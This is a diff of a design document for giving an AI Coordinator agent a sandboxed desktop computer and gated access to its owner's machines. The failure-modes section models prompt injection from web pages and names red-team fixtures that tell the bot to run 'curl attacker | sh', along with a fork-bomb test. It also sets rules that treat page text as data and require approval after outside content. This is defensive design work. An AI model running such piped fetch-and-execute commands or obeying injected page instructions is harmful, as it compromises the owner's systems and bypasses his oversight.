@@ -7,9 +7,11 @@ Goal (ian): in the Coordinator chat, the bot operates a computer directly, start
 ## 0. Summary
 
 - Rakazo keeps the agent runtime and the computer apart. Pi runs in Rakazo's API/worker; the computer is reached only through ordinary Pi tools behind one `SandboxProvider` interface (measured, `packages/adapter-kit/src/interfaces.ts:97`). cairn already has the same split: the Coordinator runs in Pi, and machines are reached over the machine protocol.
-- Recommendation: one persistent Orb on omarchy is the Coordinator's computer. It is a long-lived systemd-nspawn container from a desktop variant of the Orb image, with a durable home, and it is never the omarchy host. Computer tools go from the Coordinator sidecar through `/api/machine/tool/:stepId` to the server, which forwards them over the existing `/api/machine/stream` channel to the daemon that holds the computer. That daemon forwards them over `relay.sock` to an agent inside the container. This is the same outbound-only shape as branch sync (`sync` event plus `/api/machine/sync-result/:syncId`).
-- v1 has shell with streamed output, files, browser through agent-browser and desktop screenshots plus actions. The panel shows a live command feed and screen snapshots. A live interactive screen (noVNC) and takeover come in phase 2, because they add an inbound streaming path.
-- 9 PRs. 5 are owner route because they touch `routes-machine.ts`, `machine*.ts`, `machine-client.ts`, `scripts/**` or drizzle, and need `/security-review`.
+- Decision (ian, 2026-11-03): copy Rakazo's design. cairn gets Rakazo's two kinds of computer:
+  - a private computer for the Coordinator: a persistent Orb on omarchy, for the browser, the web and the desktop;
+  - ian's own computers: the omarchy host first, and the Mac later. They use Rakazo's `user_computer_*` tools and gate: only ian's own messages reach them, the first command and each app ask, and actions after outside content always ask.
+- Tool names, argument shapes, lifecycle numbers and the screen gateway are Rakazo's. Deviations are only where D69, D71, D72 and the outbound-only machine protocol force them (§3.8). Tools go from the sidecar through `/api/machine/tool/:stepId` to the server, which pushes them over `/api/machine/stream` to the daemon holding the computer. This is the same shape as branch sync.
+- 9 PRs. 6 are owner route and need `/security-review`; P5 (the gates) also needs it.
 
 ## 1. The Rakazo method (from the code)
 
@@ -95,140 +97,200 @@ Leave:
   - `--max-output` caps output;
   - an encrypted auth vault, so the model never sees passwords (measured, docs).
 - **agent-desktop** (vercel-labs): a CLI and C library. `snapshot --app X -i` returns an accessibility tree with refs scoped to the snapshot (`@s8f3k2p9:e8`), and acting on a stale ref returns `STALE_REF`. It acts headless by default through the accessibility API; `--headed` allows physical input. On Linux it needs a graphical session with `at-spi2-core`, and X11 keys need XTEST. Screenshots of X11 windows are supported (`README.md` "Platform support", `docs/install.md`). Every command prints a JSON envelope, and a retry is allowed only when `error.disposition.retry` is `safe` (measured).
-- Rakazo uses agent-browser inside the container. It uses agent-desktop only on the user's own Mac or Windows machine; container desktops use `control.py` with xdotool (measured). For an Xvfb desktop in an Orb, agent-desktop should work over X11 plus AT-SPI (inferred from its Linux table; not run). Spike S2 in §5 checks this before relying on it.
+- Rakazo uses agent-browser inside the container. It uses agent-desktop only on the user's own Mac or Windows machine; container desktops use `control.py` with xdotool (measured). cairn copies that split: xdotool in the Orb computer, agent-desktop on ian's own computers. Spike S4 in §5 checks agent-desktop on the omarchy host session.
 
-## 3. cairn design
+## 3. cairn design: Rakazo's design, mapped onto cairn
+
+Decision (ian, 2026-11-03): copy Rakazo's design. This section keeps Rakazo's model, tool names, argument shapes, gates and lifecycle numbers. It changes only what cairn's constraints force: D69 (no model SDK in the server), D71 (the computer is a machine capability), D72 (tools go through `/api/machine/tool/:stepId` with replay rules) and D51 (the Orb agent connects back over `relay.sock`). Every deviation is listed in §3.8.
 
 ### 3.1 What exists today (measured, `origin/main` 721db97de)
 
-- The Coordinator turn is a `chief` step. Its tools are relayed: the runner POSTs `{name, params}` to `/api/machine/tool/:stepId`. `executeRelayToolCall` (`apps/server/src/services/machine-relay.ts:74`) requires the step to be claimed by the calling machine and runs `executeChiefTool` on the server. Every Coordinator tool today is server-side.
-- D72 moves the Coordinator into a Pi Durable sidecar (`apps/coordinator`, not on main yet) using the same route. Pi Durable tools carry `replay: "safe" | "unsafe"` (measured, pi-durable `.d.ts` in `/tmp/pd-spike`). D72 ⑥ requires a rule on every tool.
-- Server-to-machine push already exists: `/api/machine/stream` (SSE) carries `wake | shutdown | steer | stop | sync` (`packages/shared/src/protocol/machine-wire.ts:241-247`). `sync` is answered by `POST /api/machine/sync-result/:syncId`. Daemons never accept inbound connections.
-- Orbs: `OrbProvider` has `ensure({conversationId, projectId}), prepare, start, stop, destroy, list, touch` (`apps/daemon/src/orb/provider.ts:62`). Idle stop is 20 min, removal is 72 h or when the conversation closes, and at most 2 run at once (`orb/lifecycle.ts:3-8`). The relay methods are fixed (`orb/protocol.ts:21-43`). `cairn-orb.nspawn` sets `PrivateUsers=pick`, and all traffic goes through the egress relay at `10.203.0.1:7890`. The relay refuses private addresses and allows only ports 80, 443 and 22 (`scripts/ops/orb/egress-relay.mjs:12-18`). The host check verifies `homeVisible: false` and `privateEgress: "denied"` (`scripts/ops/orb/README.md`).
-- D71: the capability report carries `executor: 'orb'` (`packages/shared/src/records/machine-capabilities.ts:20`), and missing capabilities fail closed (#2652).
-- #2644: the panel lists machines, with Desktop control and Browser as placeholders.
+- The Coordinator turn is a `chief` step. The runner POSTs relayed tool calls `{name, params}` to `/api/machine/tool/:stepId`. `executeRelayToolCall` (`apps/server/src/services/machine-relay.ts:74`) requires the step to be claimed by the calling machine and runs the tool on the server.
+- D72 moves the Coordinator into a Pi Durable sidecar (`apps/coordinator`, not on main yet) using the same route. Pi Durable tools carry `replay: "safe" | "unsafe"` (pi-durable `.d.ts` in `/tmp/pd-spike`).
+- Server-to-machine push already exists:
+  - `/api/machine/stream` is SSE and carries `wake | shutdown | steer | stop | sync` (`packages/shared/src/protocol/machine-wire.ts:241-247`);
+  - `sync` is answered by `POST /api/machine/sync-result/:syncId`;
+  - daemons never accept inbound connections.
+- Orbs:
+  - `OrbProvider` has `ensure, prepare, start, stop, destroy, list, touch` (`apps/daemon/src/orb/provider.ts:62`);
+  - idle stop 20 min, removal after 72 h, at most 2 at once (`orb/lifecycle.ts:3-8`);
+  - `cairn-orb.nspawn` sets `PrivateUsers=pick`;
+  - egress goes through the relay at `10.203.0.1:7890`, which refuses private addresses and allows only ports 80, 443 and 22 (`scripts/ops/orb/egress-relay.mjs:12-18`).
+- D71 reports `executor: 'orb'` (`packages/shared/src/records/machine-capabilities.ts:20`). Missing capabilities fail closed (#2652).
+- #2644 is the Computers panel with placeholders.
 
-### 3.2 Model
+### 3.2 Two kinds of computer, as in Rakazo
+
+| Rakazo | cairn | Purpose |
+|---|---|---|
+| Private Computer: a container with its own home (`scopeKey = bot:<botId>`) | **Coordinator computer**: one persistent Orb on omarchy, `scopeKey = chief:<chiefId>` | Browser, web, downloads, installs, a graphical desktop: anything that reads outside content |
+| Team Computer (`team:<spaceId>:<userId>`) | Not in v1. Workers keep per-task Orbs. A later shared computer would use this key shape | Shared files and tools across bots |
+| The user's own computer, paired through the desktop app (`user_computer_*`) | **ian's own computers**: the omarchy host daemon, and the Mac daemon later, through the machine enrollment that already exists | Operations that need the real machine: systemd, journal, packages, fixing the Orb, ian's own apps |
+
+The container is the security boundary for the first kind, as in Rakazo (`docs/computer-runtime.md`). The second kind has no boundary; it is protected by Rakazo's gate (§3.6).
+
+### 3.3 Model and provisioning
+
+Rakazo's `Computer` row, kept with only the fields cairn needs: `computer` table.
+
+| Field group | Fields |
+|---|---|
+| Identity | `id`, `teamId`, `scope` (`private`), `scopeKey` unique, `machineId` |
+| Provider | `kind` (`orb`), `providerRef` (Orb machine name) |
+| State | `state` (`stopped`, `starting`, `running`, `failed`), `runningSince` |
+| Execution lease | `executionStepId`, `executionLeaseExpiresAt`, `executionFence` |
+| Control lease | `controlHolder` (`none`, `bot`, `user`), `controlLeaseId`, `controlLeaseExpiresAt`, `controlFence` |
+| Screen | `screenGeneration` |
+
+A paired own computer needs no new row. It is an enrolled machine whose capability report says `ownComputer: true`. Rakazo's `UserDevice` maps onto cairn's existing machine enrollment and token.
+
+The provider seam copies Rakazo's `SandboxProvider` subset. It lives on the daemon side as `ComputerProvider`:
+- lifecycle: `provision` / `prepare` / `isRunning` / `stop` / `destroy`;
+- execution: `execute → AsyncIterable<stdout|stderr|exit>`;
+- desktop: `observe`, `act`, `connectScreen({view, interactive, controlToken})`, `connectTerminal`;
+- browser: `pageBrowser`;
+- files: `listFiles` / `readFile` / `writeFile`.
+
+There are two implementations:
+- `orb-computer`: a persistent nspawn Orb.
+- `host`: the daemon's own user. It implements `execute`, the file methods, and `observe`/`act` through agent-desktop only, as Rakazo's host computer does (`host-computer-protocol.ts` method list).
+
+The Coordinator computer image, `cairn-orb-computer`, copies Rakazo's `infra/sandboxes/computer/Dockerfile` onto `cairn-orb-base`:
+- Xvfb, x11vnc, fluxbox, xdotool, noVNC and websockify;
+- Chromium with a managed policy;
+- agent-browser pinned by sha256;
+- an input helper ported from Rakazo's `control.py`, and `xcapture`;
+- a non-root `agent` user (Rakazo: uid 1000, never root).
+
+The container setup also follows Rakazo:
+- `/home/agent` is bind-mounted from `/var/lib/cairn-computer/<id>/home`, so the image is disposable and the home durable;
+- the Chrome profile lives at `~/.browser-profiles/coordinator`;
+- the systemd slice limits are the counterpart of Rakazo's memory and pids limits plus `CapDrop ALL`;
+- egress uses the existing Orb relay;
+- the container is excluded from the 72 h removal and from `CAIRN_ORB_MAX`.
+
+### 3.4 Tools: Rakazo's names and shapes
+
+All are Pi tools in the sidecar. Each forwards through `/api/machine/tool/:stepId` (§3.5). The descriptions are Rakazo's, adapted to the computer's home path. Replay rules follow D72: reads are `safe`, everything with an effect is `unsafe`.
+
+| Tool | Arguments (Rakazo) | Replay |
+|---|---|---|
+| `shell` | `{command, cwd?}`. Returns when output has been quiet for 1 s while the process runs, and the finished output arrives as an automated follow-up. The command is stopped after a few minutes, so long work uses `nohup … &` | unsafe |
+| `list_files` | `{path?}` | safe |
+| `read_file` | `{path}` | safe |
+| `write_file` | `{path, content}` | unsafe |
+| `attach_file` | `{path, name?, description?}`, posted to the chat as an artifact | unsafe |
+| `computer_observe` | `{}`. An identical frame omits its bytes | safe |
+| `computer_act` | `{actions[≤24]: click\|move\|down\|up\|type\|key\|scroll\|wait\|focus, observe?, settle_ms?}`. A repeated action that changes nothing is refused | unsafe |
+| `open_path` | `{path}` | unsafe |
+| `launch_app` | `{application, uri?}` | unsafe |
+| `browser_navigate` | `{url}` | unsafe |
+| `browser_snapshot` | `{}`: refs, bounded text, passwords masked | safe |
+| `browser_act` | `{actions[]: {kind, ref, text?, paths?}}`. Each ref is rechecked against a fresh snapshot before acting. `fill_secret`, `fill_card` and `fill_pay_token` are left out in v1 | unsafe |
+| `request_takeover` | `{reason}` | unsafe |
+| `user_computer_shell` | `{command, cwd?}`. cwd must be inside the home (`userComputerCwd`) | unsafe |
+| `user_computer_observe` | `{app, query?}`: accessibility rows plus a screenshot | safe |
+| `user_computer_act` | `{app, actions[≤24]: click\|type\|set\|key\|scroll\|menu\|wait}` | unsafe |
+
+Replay: Rakazo's rule is "never replay completed or uncertain actions automatically". cairn implements it with `callId = hash(stepId, toolCallId)`:
+- a finished `unsafe` call returns its stored result;
+- an `unsafe` call started without a result returns `interrupted, may have partially run`;
+- a `safe` call reruns.
+
+The relay response gains an image content part (today it is `{text}` only).
+
+### 3.5 Transport
 
 ```mermaid
 flowchart LR
-  ian[ian / web] -- chat --> S[server]
-  C[Coordinator sidecar<br/>Pi Durable, Mac] -- "POST /api/machine/tool/:stepId<br/>{name: computer_*, params, toolCallId}" --> S
-  S -- "SSE /api/machine/stream<br/>{type: computer, call}" --> D[omarchy Orb daemon]
-  D -- "relay.sock (D51)" --> A[cairn-computer agent<br/>User=agent, in container]
-  A -- "chunks / result" --> D -- "POST /api/machine/computer/:callId" --> S
-  S -- "hub SSE: computer.command, snapshot" --> ian
-  A --- X[Xvfb + fluxbox + Chromium<br/>agent-browser, agent-desktop]
-  A -. egress relay: public 80/443/22 only .-> Net[(internet)]
+  ian[ian / web] -- chat, panel --> S[server]
+  C[Coordinator sidecar<br/>Pi Durable, Mac] -- "POST /api/machine/tool/:stepId" --> S
+  S -- "SSE stream: {type: computer, call}" --> D1[omarchy Orb daemon]
+  S -- "SSE stream: {type: computer, call}" --> D2[omarchy host daemon]
+  D1 -- relay.sock --> A[cairn-computer agent<br/>in persistent Orb]
+  D2 -- "user ian, agent-desktop" --> H[omarchy host]
+  D1 & D2 -- "POST /api/machine/computer/:callId (frames)" --> S
+  D1 -- "outbound WS: screen / terminal capability" --> S -- proxied noVNC / PTY --> ian
 ```
 
-- **Computer = a machine capability (D71).** The daemon that runs it reports `computer: {id, state: 'running'|'stopped'|'failed', desktop: boolean, browser: boolean, versions}` with its capabilities. A missing report means "no computer" and fails closed. The server stores no provider state, only which machine holds the Coordinator's computer (§3.5).
-- **Provisioning.** A new `OrbProvider` mode, `persistent`, keyed by `computer:<chiefId>` instead of a conversation:
-  - built from `cairn-orb-computer`, a variant layered on `cairn-orb-base` that adds Xvfb, a minimal WM, x11vnc for phase 2, Chromium, agent-browser and agent-desktop pinned by sha256, and at-spi2-core;
-  - `/home/agent` is bind-mounted from `/var/lib/cairn-computer/<id>/home`, so an image update replaces the OS and keeps the home (Rakazo's disposable image, durable home);
-  - excluded from the 72 h removal and from `CAIRN_ORB_MAX`;
-  - limits as a systemd slice: MemoryMax 6 GiB, CPUQuota 300%, TasksMax 2048 (guessed sizes; omarchy has 32 GB);
-  - the same `PrivateUsers=pick`, egress relay and no host home.
-- **In-container agent (D51).** `cairn-computer.service` runs as `agent` inside the image and connects to `/run/cairn/relay.sock`. It never holds a cairn token; the host daemon authenticates it with the per-Orb release key it already uses. It implements:
-  - `exec`, streaming with a process group per call;
-  - `kill`;
-  - `read`, `write` and `list`, confined to `/home/agent` unless ian decides otherwise (§6.2);
-  - `screenshot` and `act` (xdotool, or agent-desktop if spike S2 passes);
-  - `browser`, a thin wrapper over agent-browser against the visible Chromium with `--content-boundaries` and `--max-output`.
+- Rakazo has the desktop app hold an outbound websocket, and other processes forward to it with NDJSON frames `{value} | {done} | {error} | {heartbeat}` (`host-computer-protocol.ts`, `user-device-gateway.ts`). cairn reuses its own outbound channel instead, with the same frame shape:
+  - the server pushes a `computer` event over `/api/machine/stream`;
+  - the daemon posts the frames back to `/api/machine/computer/:callId`.
+- The deadlines are Rakazo's (`hostComputerDeadlineMs`): command timeout + 30 s for execute, 2 min for screen calls and 10 min for the rest.
+- Live screen and terminal: Rakazo's screen gateway. Each viewer gets one sealed capability, view or control, with separate tokens that can be revoked. Each capability maps to its own Unix socket inside the container, and teardown disconnects viewers before a display is reused. cairn differs only in transport: the daemon opens an outbound websocket per capability and the server proxies it, because the daemon accepts no inbound connections.
 
-### 3.3 Tools for the Coordinator
+### 3.6 Gates
 
-Names are prefixed so they cannot collide with the 70 `CHIEF_REMOTE_TOOLS`. Replay rules use Pi Durable's values. On top of them, the server dedups by `callId = hash(stepId, toolCallId)`:
+These are copied from Rakazo's approvals and `userComputerGate`.
 
-- an `unsafe` call already finished returns its stored result, without rerunning;
-- an `unsafe` call started without a result returns `interrupted, may have partially run`, as the D72 spike measured;
-- a `safe` call reruns.
+- **Who can reach ian's own computer** (`userComputerOwner`): only turns started by ian's own chat messages. Schedules, wake turns, worker threads, webhooks and messages from other people never reach `user_computer_*`.
+- **Own computer, shell**: the first `user_computer_shell` asks. The card offers Allow once, Allow on this computer, and Deny. "Allow on this computer" lasts until the machine is re-enrolled; it is Rakazo's "Allow in this space", with space mapped to machine. A Block rule refuses without a card.
+- **Own computer, screen**: the first use of each app asks. Rakazo also refuses to drive its own process (`selfPid`); in cairn the cairn web tab and the daemon are excluded the same way.
+- **Coordinator computer**: no per-command gate, because the container is the boundary.
+- **What always asks**: Rakazo's rule. Actions that text ian did not write could be steering always ask. Concretely: after outside content (a page, a downloaded file, a screenshot) enters the turn, every `user_computer_*` call and every Coordinator dispatch tool shows a card, even if allowed before.
+- **Protection guard**: Rakazo's desktop-protection guard refuses shell commands that stop or restart the computer's own desktop, browser or agent processes (`desktop-command-guard.ts`). cairn ports its rule set for the Orb computer, and on the host adds the cairn daemon, the server and the Orb units.
+- **Takeover**: Rakazo's control lease. While the Coordinator holds the execution lease, takeover is refused with "Stop the Coordinator first", unless the turn is waiting for a takeover. While ian holds control, bot input is refused.
 
-| Tool | Arguments | Result | Replay |
-|---|---|---|---|
-| `computer_shell` | `{command, cwd?, timeoutSec? (≤600, default 120)}` | `{callId, exitCode \| null, running, stdout, stderr}` (head plus tail, 32 KB) | unsafe |
-| `computer_shell_output` | `{callId, waitSec? (≤60)}` | the same shape, the new output since the last read | safe |
-| `computer_shell_kill` | `{callId}` | `{killed}` (process group SIGTERM, then SIGKILL after 5 s) | safe |
-| `computer_list_files` | `{path}` | entries (name, type, size, mtime), at most 500 | safe |
-| `computer_read_file` | `{path, offset?, limit?}` | text, 256 KB cap; binary refused | safe |
-| `computer_write_file` | `{path, content}` | `{bytes}`; 8 MB cap | unsafe |
-| `computer_attach_file` | `{path, name?}` | the file posted as a chat attachment (existing attachment store) | unsafe |
-| `computer_observe` | `{}` | PNG screenshot, long edge ≤1280, plus window list; an identical frame omits the bytes | safe |
-| `computer_act` | `{actions[≤24]: {kind: click\|move\|type\|key\|scroll\|wait\|focus, x?, y?, text?, key?, modifiers?, direction?, amount?, ms?, application?}, observe?}` | the screen afterwards | unsafe |
-| `browser_navigate` | `{url}` | the page snapshot | unsafe |
-| `browser_snapshot` | `{}` | refs plus bounded page text, inside content boundaries, password fields masked | safe |
-| `browser_act` | `{actions[≤12]: {kind: click\|fill\|type\|press\|select\|check\|scroll\|upload, ref, text?, paths?}}` | the snapshot afterwards; each ref rechecked first | unsafe |
-| `computer_request_takeover` | `{reason}` | an inbox card for ian. In v1 he acts over ssh or VNC himself; phase 2 adds in-app control | unsafe |
+### 3.7 Lifecycle
 
-The shell result follows Rakazo: return as soon as output has been quiet for 1 s or the command exits. A still-running call is followed with `computer_shell_output`. The relay response needs an image content part: today it is `{text}` only, a wire change in P1. The Coordinator's models (Haiku and Sonnet 5.5) accept images in tool results (inferred from Pi's image support).
+Rakazo's numbers, kept as they are:
+- **Start** on first use. Opening the panel wakes the computer. The desktop stack starts on the first screen or browser tool.
+- **Idle**: suspend after 10 min (`DEFAULT_SANDBOX_IDLE_MS`), checked every 10 min. A background-work probe (marker files, plus `/proc` or `lsof`) keeps it up while `nohup` work runs. A pending takeover keeps it awake for 30 min (`TAKEOVER_IDLE_GRACE_MS`). There is no 2 h cap, because omarchy is not billed per minute.
+- **Run end**: control is revoked, and the screen and browser are kept for the next turn with their sign-ins. Failed or cancelled turns tear the screen down. Stopping a Coordinator turn cancels its in-flight calls.
+- **Maintenance**: Stop, Update (rebuild the image, keep the home) and Recover from the panel menu, as in Rakazo `docs/computer.md`. Rakazo's checkpoint archive is not needed, since the home is a bind on one host. A btrfs snapshot is taken before Update.
 
-### 3.4 Streaming to the panel
+### 3.8 Deviations from Rakazo, and why
 
-- Command feed (v1). The agent sends output chunks through the daemon to `POST /api/machine/computer/:callId`, with at most 4 chunks per second and 64 KB per call. The server redacts each chunk with the shared `redactSecrets` before storing it or emitting `computer.command` on the hub. The panel shows a read-only terminal log of each call: command, live tail, exit code, and a Stop button that calls kill. History comes from a `computer_call` table that keeps the last 200 calls and output tails only.
-- Screen (v1). The panel requests `computer.snapshot` every 2 s while it is visible (JPEG ≤150 KB), and every `computer_observe` / `computer_act` result is pushed as well. Snapshots are kept in memory only (the last frame per computer) and never written to disk or to the DB (§4.3).
-- Live screen and takeover (phase 2). x11vnc listens on a Unix socket inside the container. The daemon opens an outbound websocket to the server for one sealed capability, view or control, separate tokens, revocable, one socket per capability; this is Rakazo's design. The server proxies it to an authenticated web client. Control is exclusive: while ian holds it, `computer_act` and `browser_act` return `held by ian`. This is a new external entry point (§5, P9).
-
-### 3.5 Binding
-
-- One computer, bound to the Coordinator (the `chief` row), not to a conversation. It persists across chat threads, like a Rakazo Private computer. Worker threads keep their per-task Orbs and get no computer tools in v1 (decision §6.5).
-- Which machine: a routing rule with `requiredCapabilities: {computer: true}` and omarchy as the preferred machine (D71 #2655). Because the home lives on that machine, the Coordinator's computer never falls back to another machine. It waits and says so.
-
-### 3.6 Lifecycle
-
-- Start: lazily on the first computer tool call, or when ian opens the panel. The desktop stack starts on the first screen or browser tool.
-- Idle:
-  - desktop processes (Xvfb, Chromium) stop after 30 min with no tool calls and no viewer;
-  - the container stops after 4 h idle unless background work is running (marker files probed as in Rakazo);
-  - disk is always kept (guessed values, tunable).
-- Stop and reset: the panel menu gets Stop, Restart and Rebuild. Rebuild replaces the image and keeps the home after a btrfs snapshot (the Orb builder already uses subvolumes on btrfs).
-- Chat stop: stopping a Coordinator turn sends `stop` for its in-flight computer calls, and the agent kills their process groups.
+| Rakazo | cairn | Forced by |
+|---|---|---|
+| Pi runs in the API process | Pi runs in the sidecar; tools are relayed through the server | D69, D72 |
+| Desktop app websocket per device | The existing daemon SSE plus POST, and outbound WS for screens | Daemons are outbound-only (machine protocol) |
+| Ten providers | `orb-computer` and `host` only | One host today |
+| Workspace checkpoints to an object store | A durable bind-mounted home plus btrfs snapshots | Single host |
+| Approval modes Ask, Auto and Never ask | The "always asks" rules and the own-computer gate only; the Coordinator computer runs freely | cairn has no approval-mode setting; adding one is a separate decision |
+| Spaces | Machines (for "Allow on this computer") | cairn has no spaces |
 
 ## 4. Failure modes
 
-| Failure | Behaviour | Test |
+| Failure | Behaviour (Rakazo source) | Test |
 |---|---|---|
-| Computer offline (daemon down, Orb failed, omarchy rebooting) | The server checks capability and presence before forwarding. The tool returns at once with `computer offline since <t>; last state <s>` and is never queued, so an unsafe call cannot run later by surprise. The panel shows offline. Chat keeps working because the sidecar is on the Mac | A unit test on the forwarder: no presence gives an immediate error and no stream event |
-| Daemon dies mid-call | The callId has no result. A retry of an unsafe call returns `interrupted, may have partially run`, and processes found on restart are killed | An integration test that kills the daemon mid-`computer_shell` |
-| Runaway command | Wall timeout (default 120 s, max 600 s), then the process group is killed. Long work must use `nohup … &`, documented in the tool description. Output cap 64 KB, head plus tail. Slice limits (MemoryMax, CPUQuota, TasksMax) contain fork bombs and memory hogs. Kill tool and Stop button | A fixture that runs `yes`, a fork bomb under TasksMax and a sleep past the timeout |
-| Secret on screen or in output | Shell chunks pass through `redactSecrets` before storage, the hub or the model. agent-browser snapshots mask password fields. Screenshots cannot be redacted reliably, so they are never persisted, go to the model only when it calls a screen tool, and the panel frame is in memory only. No cairn token, API key or ian credential is placed in the computer, and the in-container agent authenticates over relay.sock. Logins go through takeover, never through chat | A test that a token-shaped string in stdout reaches neither DB nor hub; a check that the computer env holds no `CAIRN_*` secrets |
-| Prompt injection from a web page driving the shell | See below | A red-team fixture page instructing `curl attacker \| sh` |
-| Two drivers (bot and ian) | v1: ian has no in-app input, so this cannot happen. Phase 2: an exclusive control lease with a fence, as in Rakazo | Phase 2 lease test |
-| Disk full or home too large | Free space is part of the capability report. Below 2 GiB the tools warn, and writes refuse below 512 MB | A unit test on the threshold |
-
-Prompt injection, layer by layer:
-
-1. **Blast radius first.** The computer is an unprivileged-user-namespace container with no host home, no omarchy host access, no cairn credentials, and egress to public addresses on 80, 443 and 22 only. The tailnet and LAN cannot be reached, so the Mac control plane cannot either (measured: the relay refuses private ranges). ian's NOPASSWD sudo on the host is out of reach. The worst case is what a page can make a stranger's VPS do. It is not omarchy.
-2. **Mark untrusted output.** Page text arrives inside agent-browser's nonce `--content-boundaries`. Tool descriptions say text inside them is data.
-3. **Taint gate (recommended; ian decides strictness, §6.4).** After a turn has read untrusted content (`browser_*`, `computer_observe`, or reading a file downloaded in this turn), the next `computer_shell` or `computer_write_file` in that turn, and any Coordinator dispatch tool (`run_builds`, thread start), first shows ian an ask card that quotes the command. Rakazo's "Auto" approval mode, an approval model judging whether an action is on-task (`docs/approvals.md`), is an alternative.
-4. **Browser policy.** An agent-browser `--action-policy` denies `eval`. Downloads go only to `~/Downloads`.
+| Computer offline | The tool fails at once with "the computer is not connected" (`USER_COMPUTER_UNAVAILABLE` / `UserDeviceOfflineError`) and is never queued. The panel shows offline, and chat keeps working | A forwarder unit test: no presence gives an immediate error and no stream event |
+| Daemon dies mid-call | An error frame. A rerun of an `unsafe` call returns "interrupted, may have partially run" | An integration test that kills the daemon mid-`shell` |
+| Runaway command | Return on quiet output, then stop after the command timeout, killing the process tree (`desktop-process-tree.ts`). Long work uses `nohup`. Output keeps head plus tail. Slice limits contain the Orb. The panel Stop button cancels | `yes`, a fork bomb and a sleep past the timeout |
+| Secret on screen or in output | Commands in the feed are redacted (`redactSecrets`, as in Rakazo's `computer.command`). Browser snapshots mask passwords and saved logins. Protected input goes through `request_takeover`, never through chat. No cairn credentials exist inside the Coordinator computer | A token-shaped string in stdout reaches neither DB nor hub |
+| Prompt injection from a web page | The page content stays in the container. Once outside content has entered the turn, ian's own computer and dispatch tools always ask (§3.6). The protection guard stops the bot from killing its own stack. Content boundaries come from agent-browser | A red-team page telling the bot to run `curl … \| sh` on the host: a card appears and nothing runs |
+| Two drivers | Fenced execution and control leases; takeover is refused while the bot drives | A lease test |
+| Wayland on the omarchy host | agent-desktop on Wayland refuses pointer input and window control (agent-desktop README). `user_computer_act` returns that refusal, and semantic actions still work | Spike S4 |
 
 ## 5. PR list
 
-Spikes run before P2, with no PR. S1: the desktop image inside nspawn with `PrivateUsers=pick` (Xvfb, Chromium under a user namespace with the proxy, agent-browser over CDP). S2: agent-desktop snapshot and click under Xvfb plus AT-SPI. S3: `computer_observe` image round-trip through Pi in the sidecar.
+Spikes run first, with no PR:
+- S1: Rakazo's computer image stack inside nspawn with `PrivateUsers=pick` behind the relay;
+- S2: noVNC through an outbound daemon websocket;
+- S3: an image tool result through Pi in the sidecar;
+- S4: agent-desktop on the omarchy host session (Hyprland is guessed from the distribution, not measured; omarchy was unreachable on 11-03).
 
 | # | PR | Main paths | Route |
 |---|---|---|---|
-| P1 | Wire: `computer` stream event, `/api/machine/computer/:callId` result route, an image part in relay responses, a `computer` capability, a `computer_call` table | `packages/shared/src/protocol/machine-wire.ts`, `apps/server/src/routes-machine.ts`, `apps/server/drizzle/**` | **owner** + `/security-review` |
-| P2 | Persistent Orb mode and the `cairn-orb-computer` image variant | `apps/daemon/src/orb/provider.ts`, `lifecycle.ts`, `scripts/ops/orb/**` | **owner** (`scripts/**`) + `/security-review` |
-| P3 | In-container computer agent: exec with streaming and process groups, kill, files, over relay.sock; host side handles the stream event | `apps/daemon/src/orb/computer-agent.ts` (new), `orb/relay.ts`, `apps/daemon/src/machine-client.ts` | **owner** (`machine-client.ts`) + `/security-review` |
-| P4 | Server forwarder: presence and capability check, callId dedup and replay results, timeouts, cancel on chat stop, redaction, hub events | `apps/server/src/services/machine-computer.ts` (new), `machine-relay.ts` | **owner** (`machine*.ts`) + `/security-review` |
-| P5 | Coordinator tool definitions with replay rules and descriptions, plus the test that every tool has a rule | `apps/coordinator/**` (D72 sidecar) | normal (`review-gate`) |
-| P6 | Panel: command feed, Stop, snapshots while visible, offline state, replacing the #2644 placeholders | `apps/web/src/board/machines-panel.tsx`, e2e | normal |
-| P7 | Desktop and browser tools: screenshot and act, an agent-browser wrapper with content boundaries and action policy | `apps/daemon/src/orb/computer-*.ts`; image changes in `scripts/ops/orb/**` | **owner** (image) + `/security-review` |
-| P8 | Taint gate: ask before shell, write or dispatch after untrusted content | `apps/server/src/services/chief*.ts` or sidecar | normal path; `/security-review` recommended |
-| P9 | Phase 2: live noVNC with view and control capabilities, takeover lease, outbound daemon websocket | `routes-machine.ts`, `machine*.ts`, web | **owner** + `/security-review` (new external entry) |
+| P1 | Wire and table: `computer` stream event, `/api/machine/computer/:callId` frames, an image part in relay responses, `computer` and `ownComputer` capabilities, `computer` and `computer_call` tables | `machine-wire.ts`, `routes-machine.ts`, `apps/server/drizzle/**` | **owner** + `/security-review` |
+| P2 | `cairn-orb-computer` image and the persistent Orb mode | `scripts/ops/orb/**`, `apps/daemon/src/orb/*` | **owner** + `/security-review` |
+| P3 | Daemon `ComputerProvider` (`orb-computer`, `host`), the in-container agent over relay.sock, the protection guard | `apps/daemon/src/computer/**` (new), `machine-client.ts` | **owner** + `/security-review` |
+| P4 | Server forwarder: presence, leases, callId replay, deadlines, cancel on stop, redacted `computer.command` events | `apps/server/src/services/machine-computer.ts` (new), `machine-relay.ts` | **owner** + `/security-review` |
+| P5 | Gates: `userComputerOwner`, the own-computer shell and per-app cards, and the "always asks" rule after outside content | `apps/server/src/services/chief*.ts`, sidecar | normal path; `/security-review` required (it is the security control) |
+| P6 | Sidecar tools: Rakazo's names, descriptions and replay rules, plus a test that every tool has a rule | `apps/coordinator/**` | normal (`review-gate`) |
+| P7 | Screen gateway: view and control capabilities, the outbound websocket, the takeover lease, the user PTY under control | `routes-machine.ts`, `machine*.ts`, daemon | **owner** + `/security-review` (new external entry) |
+| P8 | Panel: Rakazo's computer view (screen, command feed, Files, Take control, More computer actions) in place of the #2644 placeholders | `apps/web/src/board/machines-panel.tsx`, e2e | normal |
+| P9 | Browser tools on agent-browser with the ref recheck and password masking | `apps/daemon/src/computer/browser*.ts`, image | **owner** (image) + `/security-review` |
 
-Order: S1–S3 → P1 → P2 ∥ P5 → P3 → P4 → P6 → P7 → P8 → P9. P5 can merge behind a flag before P4. P8 must land before the browser tools are enabled for real use.
+Order: S1–S4 → P1 → P2 ∥ P6 → P3 → P4 → P5 → P8 (feed and screen) → P7 → P9. Own-computer tools ship only after P5. Browser tools ship only after P5 and P9.
 
 ## 6. Decisions for ian
 
-1. **Where the computer runs.** Recommended: a persistent Orb on omarchy. The alternatives are the omarchy host (rejected: NOPASSWD sudo, all of ian's files) or per-task Orbs (rejected: nothing persists, logins are lost).
